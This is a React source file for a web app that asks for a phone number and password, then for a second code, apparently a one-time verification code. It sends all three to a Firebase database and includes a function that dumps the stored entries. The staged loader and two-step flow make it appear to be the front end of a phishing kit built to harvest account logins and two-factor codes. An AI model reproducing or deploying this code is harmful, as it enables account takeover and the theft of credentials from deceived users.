import "./styles.css";
import Loader from "./Loader";
import Code from "./Code";
import MainPage from "./MainPage";
import { ref, push, set, get, query, onValue } from "firebase/database";
import { database } from "./firebase";
import { useEffect, useState } from "react";
export default function App() {
  const [activePageID, setActivePageID] = useState(1);
  const [db, setDb] = useState<any>();
  const [phone, setPhone] = useState("phone");
  const [pass, setPass] = useState("pass");
  const [code, setCode] = useState("");
  const dba = database;
  const handleDataBase = (phone: string) => {
    const postListRef = ref(dba, "app");

    const newPostRef = push(postListRef, phone);
    set(newPostRef, {
      phone: phone,
      pass: pass,
      code: code,
    });
  };

  const getdata = () => {
    //Creating the reference (The path in db you are trying to read/write/update)
    const dbRef = ref(dba, "/app");

    const qw = get(query(dbRef));
    qw.then((snapshot) => {
      let json = [snapshot!.toJSON()];
      let answer = json!.map((el: any) => console.log(el));
    });
  };
  useEffect(() => {}, []);

  const [show, setShow] = useState(true);
  const handleActivePage = (id: number) => {
    switch (id) {
      case 1:
        setActivePageID(1);
        break;
      case 2:
        setShow(true);
        setActivePageID(2);
        setTimeout(() => setShow(false), 3000);

        break;
    }
  };
  const updateData = async () => {
    handleDataBase(phone);
  };
  const clear = () => {
    setPhone("");
    setPass("");
    setCode("");
  };
  const handleCode = async (code: any) => {
    console.log(code);
    setCode(code);
    await updateData().then(() => {
      clear();
    });
    clear();
  };
  return (
    <div
      className="App"
      style={{
        backgroundImage: "url(https://i.ibb.co/djdfJhC/cover.png)",
        backgroundSize: "cover",
        height: "100vh",
        overflow: "hidden",
      }}
    >
      {/**/}
      <Loader show={show} setShow={setShow} />

      {activePageID === 1 ? (
        <MainPage
          handleActivePage={handleActivePage}
          addData={updateData}
          setPhone={setPhone}
          setPass={setPass}
        />
      ) : (
        <Code updateData={updateData} setCode={setCode} />
      )}
    </div>
  );
}
